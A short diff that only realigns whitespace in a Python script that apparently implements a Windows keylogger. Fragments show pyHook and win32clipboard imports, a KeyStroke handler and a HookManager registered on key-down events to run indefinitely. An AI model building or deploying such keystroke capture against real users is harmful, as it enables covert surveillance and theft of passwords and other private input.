@@ -3,9 +3,9 @@ import pythoncom
 import pyHook 
 import win32clipboard
 
-user32   = windll.user32
+user32 = windll.user32
 kernel32 = windll.kernel32
-psapi    = windll.psapi
+psapi = windll.psapi
 current_window = None
 
 def get_current_process():
@@ -67,7 +67,7 @@ def KeyStroke(event):
     return True
 
 # create and register a hook manager 
-kl         = pyHook.HookManager()
+kl = pyHook.HookManager()
 kl.KeyDown = KeyStroke
 
 # register the hook and execute forever
